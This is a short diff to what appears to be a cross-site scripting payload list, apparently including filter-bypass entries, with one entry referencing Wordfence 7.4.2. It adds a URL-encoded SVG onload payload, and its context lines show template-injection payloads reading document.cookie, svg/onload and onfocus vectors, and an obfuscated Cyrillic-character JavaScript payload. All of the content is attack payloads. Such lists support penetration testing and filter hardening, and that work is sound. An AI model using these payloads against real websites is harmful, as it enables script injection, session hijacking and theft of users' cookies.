@@ -7,6 +7,7 @@
 {{alert(document.cookie)}}
 {{$emit.constructor\alert(document.cookie)`()}}`
 {{$emit.constructor`alert(document.cookie)`()}}
+</h1>%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
 <0 name="<svg/onload=alert(1)>">
 </ <a href="><svg/onload=alert(1)>">
 <?<a href="><svg/onload=alert(2)>">
@@ -1776,6 +1777,7 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
 
 
 
